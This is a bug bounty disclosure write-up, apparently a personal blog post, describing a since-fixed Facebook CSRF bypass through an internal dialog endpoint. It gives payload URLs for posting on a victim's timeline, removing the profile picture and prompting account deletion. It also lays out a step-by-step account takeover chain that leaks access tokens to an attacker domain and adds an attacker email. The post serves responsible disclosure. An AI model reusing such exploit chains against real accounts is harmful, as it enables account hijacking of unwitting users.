---
id: 185
title: 'Facebook CSRF protection bypass which leads to Account Takeover.'
date: '2019-02-12T18:03:15+00:00'
author: qw
layout: post
guid: 'https://ysamm.com/?p=185'
categories:
    - Uncategorized
---

This bug could have allowed malicious users to send requests with CSRF tokens to arbitrary endpoints on Facebook which could lead to takeover of victims accounts. In order for this attack to be effective, an attacker would have to trick the target into clicking on a link.

  
**Demonstration**

  
This is possible because of a vulnerable endpoint which takes another given Facebook endpoint selected by the attacker along with the parameters and make a POST request to that endpoint after adding the fb_dtsg parameter. Also this endpoint is located under the main domain [www.facebook.com](https://www.facebook.com/) which makes it easier for the attacker to trick his victims to visit the URL.   
  
The vulnerable endpoint is:   
https://www.facebook.com/comet/dialog_DONOTUSE/?url=XXXX where XXXX is the endpoint with parameters where the POST request is going to be made (the CSRF token fb_dtsg is added automatically to the request body).  
  
This allowed me to make many actions if the victim visits this URLs. Some of these are:

  
**Make a post on timeline:**

```
https://www.facebook.com/comet/dialog_DONOTUSE/?url=
/api/graphql/%3fdoc_id=1740513229408093%26variables={"input":{"actor_id":{TARGET_ID},"client_mutation_id":"1","source":"WWW","audience":{"web_privacyx":"REDECATED"},"message":{"text":"TEXT","ranges":[]}}}
```

**Delete Profile Picture:**

```
https://www.facebook.com/comet/dialog_DONOTUSE/?
url=/profile/picture/remove_picture/%3fdelete_from_album=1%26profile_id={TARGET_ID} 
```

**Trick user to delete their account (After changing language with “locale” parameter)**

```
https://www.facebook.com/comet/dialog_DONOTUSE/?
url=/help/delete_account/dialog/%3f__asyncDialog=0%26locale=fr_FR
```

This will promote a password confirmation dialog, if the victim enters his password then his account will be deleted.

**Account Takeover Approach**

To takeover the account, we have to add a new email address or phone number to the victim account. The problem here is that the victim has to visit two separate URLs , one to add the email/phone and one to confirm it because the “normal” endpoints used to add emails or phone numbers don’t have a “next” parameter to redirect the user after a successful request.  
So to bypass this, i needed to find endpoints where the “next” parameter is present so the account takeover could be made with a single URL.  
  
**1)** We authorize the attacker app as the user then we redirect to **https://www.facebook.com/v3.2/dialog/oauth** which will automatically redirect to the attacker website with access_token having the scopes allowed to that app (this happens without user interaction because the app is already authorized using the endpoint **/ajax/appcenter/redirect_to_app**).  
This URL should be sent to the user:

```
https://www.facebook.com/comet/dialog_DONOTUSE/?url=
/ajax/appcenter/redirect_to_app%3fapp_id={ATTACKER_APP}%26ref=appcenter_top_grossing%26redirect_uri=https%3a//www.facebook.com/v3.2/dialog/oauth%3fresponse_type%3dtoken%26client_id%3d{ATTACKER_APP}%26redirect_uri%3d{DOUBLE_URL_ENCODED_LINK}%26scope%3d&preview=0&fbs=125&sentence_id&gift_game=0&scopes[0]=email&gdpv4_source=dialog
```

This step is needed for multiple things:  
First to use the endpoint **/v3.2/dialog/oauth** to bypass Facebook redirect protection in the “next” parameter which blocks redirecting attempts to external websites even if they are made using linkshim.  
Second to identify each victim using the token received which will help later to extract the confirmation code for that specific user.  
  
**2)**The attacker website receives the access token of the user , creates an email for him under that domain and redirect the user to :

```
https://www.facebook.com/comet/dialog_DONOTUSE/?
url=/add_contactpoint/dialog/submit/%3fcontactpoint={EMAIL_CHOSEN}%26next=
/v3.2/dialog/oauth%253fresponse_type%253dtoken%2526client_id%253d{ATTACKER_APP}%2526redirect_uri%253d{DOUBLE_URL_ENCODED_LINK]
```

This URL does the follow:  
First it links an email to the user account using the endpoint **/add_contactpoint/dialog/submit/** (no password confirmation is required).   
After the linking, it redirects to the selected endpoint in “next” paramter:  
  
`"/v3.2/dialog/oauth?response_type=token&client_id={ATTACKER_APP}&redirect_uri={ATTACKER_DOMAIN}" `  
  
which will redirect to the “ATTACKER_DOMAIN” again with the user access_token.

**3)** The attacker website receives the “access_token”, extract the user ID then search for the email received for that user and gets the confirmation link then redirects again to :  
  
` https://www.facebook.com/confirmcontact.php?c={CODE}&z=0&gfid={HASH}`  
  
(CODE and HASH are in the email received from Facebook)  
  
This method is simpler for the attacker but after the linking the endpoint redirects the victim to **https://www.facebook.com/settings?section=email** which expose the newly added email so the confirmation could be done using the **/confirm_code/dialog/submit/** endpoint which have a “next” parameter that could redirect the victim to the home page after the confirmation is made.

**4)** The email is now added to the victim account, the attacker could reset the password and takeover the account.  
  
The attack seems long but it’s done in a blink of an eye and it’s dangerous because it doesn’t target a specific user but anyone who visits the link in step 1   
(This is done with simple scripts hosted in the attacker website)  
  
**Timeline**  
  
Jan 26, 2019 — Report Sent  
Jan 26, 2019— Acknowledged by Facebook  
Jan 28, 2019 — More details sent  
Jan 31, 2019— Fixed by Facebook  
Feb 12, 2019 — Bounty Awarded by Facebook